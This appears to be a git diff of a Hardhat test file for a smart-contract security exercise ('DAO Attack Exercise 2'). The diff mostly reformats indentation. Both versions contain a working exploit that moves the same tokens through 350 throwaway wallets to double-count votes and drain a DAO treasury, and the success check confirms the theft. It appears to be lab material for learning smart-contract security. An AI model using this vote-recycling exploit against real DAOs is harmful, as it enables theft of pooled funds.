@@ -1,7 +1,7 @@
 import { ethers } from 'hardhat';
 import { expect } from 'chai';
 import { SignerWithAddress } from '@nomicfoundation/hardhat-ethers/signers';
-import { TheGridDAO, TheGridTreasury } from '../typechain-types';
+import { TheGridDAO, TheGridTreasury } from '../../typechain-types';
 
 import { Signer } from 'ethers';
 const { provider, deployContract, getSigners, parseEther } = ethers;
@@ -112,56 +112,56 @@ describe('DAO Attack Exercise 2', function () {
 	});
 
 	it('Exploit', async function () {
-        // We need more than 3500 votes
-        // We own 10 tokens
-        // Vote from 350 signers --> 3510 yes
+		// We need more than 3500 votes
+		// We own 10 tokens
+		// Vote from 350 signers --> 3510 yes
 
-        let currentSigner: Signer = attacker;
-        let nextSigner;
+		let currentSigner: Signer = attacker;
+		let nextSigner;
 
-        for(let i=0; i < 350; i++) {
+		for (let i = 0; i < 350; i++) {
 
-            // Create a new random signer
-            nextSigner = ethers.Wallet.createRandom().connect(ethers.provider);
+			// Create a new random signer
+			nextSigner = ethers.Wallet.createRandom().connect(ethers.provider);
 
-            // Transfer tokens to the new signer
-            await dao.connect(currentSigner).transfer(nextSigner.address, ATTACKER_TOKENS)
+			// Transfer tokens to the new signer
+			await dao.connect(currentSigner).transfer(nextSigner.address, ATTACKER_TOKENS)
 
-            // Vote yes from the new signer
-            await attacker.sendTransaction({
-                to: nextSigner.address,
-                value: ethers.parseEther('0.05')
-            });
-            
-            await dao.connect(nextSigner).vote(3, true);
-            currentSigner = nextSigner;
-        }
-        
-    }).timeout(100000000);
+			// Vote yes from the new signer
+			await attacker.sendTransaction({
+				to: nextSigner.address,
+				value: ethers.parseEther('0.05')
+			});
+
+			await dao.connect(nextSigner).vote(3, true);
+			currentSigner = nextSigner;
+		}
+
+	}).timeout(100000000);
 
 	after(async function () {
 		/** SUCCESS CONDITIONS - DON'T CHANGE ANYTHING HERE */
 
 		// Other DAO Members vote "no" on the attacker's proposal
-        await dao.connect(deployer).vote(3, false)
-        await dao.connect(daoMember1).vote(3, false)
-        await dao.connect(daoMember2).vote(3, false)
+		await dao.connect(deployer).vote(3, false)
+		await dao.connect(daoMember1).vote(3, false)
+		await dao.connect(daoMember2).vote(3, false)
 
-        // Fast forward EVM 1 day so proposal can be executed
-        await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 day
-        // Attacker is trying to execute proposal
-        await dao.connect(attacker).execute(3);
+		// Fast forward EVM 1 day so proposal can be executed
+		await ethers.provider.send("evm_increaseTime", [1 * 24 * 60 * 60]); // 1 day
+		// Attacker is trying to execute proposal
+		await dao.connect(attacker).execute(3);
 
-        // No ETH left in treasury
-        expect(
-            await ethers.provider.getBalance(treasury.target)
-        ).to.be.equal('0');
+		// No ETH left in treasury
+		expect(
+			await ethers.provider.getBalance(treasury.target)
+		).to.be.equal('0');
 
-        // Attacker stole all ETH from the treasury
-        expect(
-            await ethers.provider.getBalance(attacker.address)
-        ).to.be.gt(attackerInitialETHBalance
-        + treasuryBalanceAfterFirstProposal
-        - ethers.parseEther('20'));
+		// Attacker stole all ETH from the treasury
+		expect(
+			await ethers.provider.getBalance(attacker.address)
+		).to.be.gt(attackerInitialETHBalance
+			+ treasuryBalanceAfterFirstProposal
+			- ethers.parseEther('20'));
 	});
 });
